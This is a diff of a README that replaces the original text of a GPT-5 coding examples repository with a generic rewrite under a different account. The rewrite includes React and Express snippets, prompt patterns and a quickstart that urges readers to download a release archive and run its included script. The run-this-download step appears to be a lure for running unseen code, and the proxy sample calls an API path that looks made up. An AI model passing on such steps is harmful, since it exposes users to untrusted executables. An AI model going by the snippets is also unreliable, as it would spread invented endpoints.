@@ -1,63 +1,264 @@
-# GPT-5 Coding Examples
+[![Releases](https://img.shields.io/github/v/release/NEROUCHIHA/gpt-5-coding-examples?label=Releases&style=for-the-badge)](https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases)
 
-This repository contains a curated collection of demo applications **generated entirely in a single [GPT-5](https://platform.openai.com/docs/models/gpt-5) prompt**, without writing any code by hand.
+# GPT-5 Coding Examples: Frontend, Web & API Patterns for Devs 🚀
 
-These demos were selected to showcase the model’s strengths in coding — especially quickly scaffolding websites, front-end applications, games, and interactive UIs from natural-language descriptions. They’re intended as inspiration for you to build your own ideas.
+![Hero image](https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1500&q=80)
 
-## Explore Examples
+GPT-5 coding examples for frontend and web developers. Use these patterns to build UI flows, client-side integrations, and server APIs that call advanced language models.
 
-You can explore the demos by cloning this repo and running it locally.
+Topics: codex, coding, frontend, gpt, openai, web, website
 
-```
-cd front-end
-npm install
-npm run dev
-```
+---
 
-The app will be available at `localhost:3000`.
+## Table of contents
 
-You can also visit the [hosted version](https://gpt5-coding-examples.vercel.app/).
+- About
+- Features
+- Example projects
+- Quickstart — run a release file
+- Frontend sample
+- Server/API sample
+- Code snippets
+- File structure
+- Contribute
+- License
+- Resources
 
-From there, you can view any example, see the zero-shot prompt that created the code, and remix it for your own ideas.
+---
 
-## Build with GPT-5
+## About
 
-If you want to experiment with similar prompts, you can try GPT-5 in your preferred coding environment:
+This repo collects practical code examples that show how to use GPT-5 patterns in web apps and frontends. The goal: give clear, ready-to-run code you can adapt. The examples include UI components, prompt patterns, server proxies, and testing notes.
 
-- **[Codex CLI](https://github.com/openai/codex)** – A lightweight coding agent that runs in your terminal.
-- **Your favorite IDE or coding tool** – Use GPT-5 within your existing workflow to generate and refine code.
-- **[ChatGPT](https://chatgpt.com)** – Open ChatGPT and choose GPT-5 to generate and preview code in the browser.
+Use the examples to:
+- Prototype features.
+- Learn prompt engineering for web use cases.
+- Integrate LLM calls safely behind a server.
 
-Choose an example, copy its prompt for inspiration, and adapt it to your own needs.  
-Let GPT-5 build your idea, then iterate on the prompt or code to explore variations.
+All examples use modern tools: ES modules, React or Svelte, Node 18+, and simple fetch-based API calls. Each sample includes a short README and runnable scripts.
 
-### For Developers: Codex CLI
+---
 
-We recommend using the [**Codex CLI**](https://github.com/openai/codex) with GPT-5 for a seamless coding experience.
+## Features
 
-The Codex CLI runs in your terminal: given a prompt, it will generate code, execute it in a sandbox, and even preview the results live.
+- UI components for chat, summarization, and code generation.
+- Pattern examples for streaming responses and partial renders.
+- Server proxies that keep API keys off the client.
+- Small test harnesses and sample prompts.
+- Example integrations with web workers and local caching.
 
-Example:
+Icons
+- Chat: 💬
+- Code generation: 🧩
+- Summarization: 📝
+- Streaming: ⚡
 
+---
+
+## Example projects
+
+1. frontend-chat — React + streaming tokenizer UI.
+2. codex-playground — Web editor that submits code prompts and shows diffs.
+3. proxy-api — Minimal Node/Express proxy for server-side calls.
+4. static-site-snippets — Static HTML widgets using fetch.
+5. worker-cache — Service worker sample to cache LLM responses.
+
+Screenshots
+![Chat UI](https://images.unsplash.com/photo-1526378722905-2b7b4c7de89a?auto=format&fit=crop&w=1200&q=60)
+![Editor UI](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=60)
+
+---
+
+## Quickstart — run the release file
+
+This repo publishes packaged releases. Download the release file and execute it to get a runnable demo. Visit the Releases page, download the asset, and run the included script:
+
+1. Open the releases page:
+   https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases
+
+2. Download the release asset that matches your platform (zip, tar, or binary). The release file needs to be downloaded and executed.
+
+3. Example commands (adjust file names to the downloaded asset):
 ```bash
-codex --model gpt-5 --full-auto "Build a simple photobooth application with camera access in a single HTML file"
+# download a release asset (example file name)
+curl -L -o gpt5-examples-v1.zip https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases/download/v1.0.0/gpt5-examples-v1.zip
+
+# unzip and run the included script
+unzip gpt5-examples-v1.zip
+cd gpt5-examples
+chmod +x run-demo.sh
+./run-demo.sh
 ```
 
-GPT-5 will scaffold the app, write files, install dependencies as needed, and show a live preview. This is the **go-to solution** for developers who want to bootstrap apps or add features quickly.
+If the release link does not match your system or the asset name differs, check the Releases section on GitHub for the correct file and instructions:
+https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases
 
-You can also use GPT-5 with any other AI coding tool that supports the model.
+---
 
-### For Non-Developers: ChatGPT
+## Frontend sample (Chat UI)
 
-If you don’t have a coding environment, you can use [**ChatGPT**](https://chatgpt.com) (with GPT-5) to build and preview apps entirely in the browser:
+A compact React example that streams tokens and updates the UI as the model responds.
 
-1. Copy an example’s prompt for inspiration and customize it to make it your own.
-2. Let GPT-5 generate the code (HTML/CSS/JavaScript).
-3. Open it in **Canvas** preview to see it run live.
-4. Download or copy the output HTML for real-world use.
+Key points:
+- Use a server proxy: never expose API keys on the client.
+- Render incremental tokens.
+- Show partial suggestions and a final result.
 
-With this method, _anyone_ can create a working single-page app — no local setup required.
+App structure:
+- src/
+  - App.jsx
+  - ChatInput.jsx
+  - MessageList.jsx
+  - stream.js
 
-> [!NOTE]
-> We are not accepting contributions at this time.  
-> This repo is for **reference and inspiration only**. If you’d like to build on these ideas, please fork the repo for your own experiments.
+Sample client call (streaming pseudo-code):
+```js
+// POST to your server proxy which forwards to the model
+fetch('/api/gpt5/stream', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ prompt: 'Summarize this page' })
+}).then(async res => {
+  const reader = res.body.getReader();
+  while (true) {
+    const { value, done } = await reader.read();
+    if (done) break;
+    const chunk = new TextDecoder().decode(value);
+    // parse and append tokens to UI
+  }
+});
+```
+
+UI tips:
+- Show typing indicator while streaming.
+- Allow cancellation via abort controller.
+- Buffer short tokens and flush to reduce DOM thrash.
+
+---
+
+## Server / API sample (Node proxy)
+
+Provide a single endpoint that forwards calls to the GPT-5 API. This keeps the key server-side.
+
+Minimal Express proxy:
+```js
+import express from 'express';
+import fetch from 'node-fetch';
+
+const app = express();
+app.use(express.json());
+
+app.post('/api/gpt5', async (req, res) => {
+  const prompt = req.body.prompt;
+  const apiRes = await fetch('https://api.openai.com/v1/gpt-5/generate', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ prompt, max_tokens: 400 })
+  });
+  const data = await apiRes.json();
+  res.json(data);
+});
+
+app.listen(3000);
+```
+
+Security checklist:
+- Store API keys in env vars.
+- Rate limit and log calls.
+- Validate prompt length and content as needed.
+
+---
+
+## Code snippets and prompt patterns
+
+Prompt: concise summarization
+```
+You are a helpful assistant. Summarize the text below in 3 bullet points.
+
+Text:
+{document}
+```
+
+Prompt: code explain
+```
+You are a senior developer. Explain this function line by line and list edge cases.
+
+Code:
+{code}
+```
+
+Pattern: few-shot for better output
+- Provide 2–3 examples of desired input → output pairs.
+- Ask for consistent format (JSON or bullets).
+- Add final instruction to keep replies short.
+
+Example: return JSON
+```
+You will return valid JSON with keys: summary, actions.
+Example:
+Input: "..."
+Output: {"summary":"...", "actions":["..."]}
+
+Now process:
+{document}
+```
+
+---
+
+## File structure
+
+Suggested top-level layout:
+- /frontend-chat — React streaming chat
+- /codex-playground — editor + code run flow
+- /proxy-api — Node proxy and examples
+- /static-widgets — vanilla JS widgets for static sites
+- /docs — design notes, prompt patterns
+- /bin — sample release scripts and demo runners
+
+Each example includes a README with run steps and environment variables.
+
+---
+
+## Testing and local dev
+
+- Use lightweight test harnesses. Example: Playwright or Cypress for UI flows.
+- Mock remote LLM responses in tests. Inject canned tokens for streaming tests.
+- Snapshot prompt outputs and update intentionally.
+
+Dev tricks:
+- Use small tokens for unit tests.
+- Use environment toggles to swap real vs mock endpoints.
+
+---
+
+## Contributing
+
+- Fork the repo.
+- Add a sample or improvement in a focused folder.
+- Include a short README for your sample and a run script.
+- Make small commits and open a PR with a clear title.
+
+Guidelines:
+- Keep examples simple and self-contained.
+- Include expected inputs and outputs.
+- Prefer minimal dependencies.
+
+---
+
+## License
+
+This repository uses the MIT License. See LICENSE.md for details.
+
+---
+
+## Resources
+
+- Official OpenAI docs — general API patterns
+- Streaming best practices — partial renders and cancellation
+- UI patterns for chat apps — message buffering and scroll anchors
+
+Badges
+[![Releases](https://img.shields.io/github/v/release/NEROUCHIHA/gpt-5-coding-examples?label=Releases&style=flat-square)](https://github.com/NEROUCHIHA/gpt-5-coding-examples/releases)
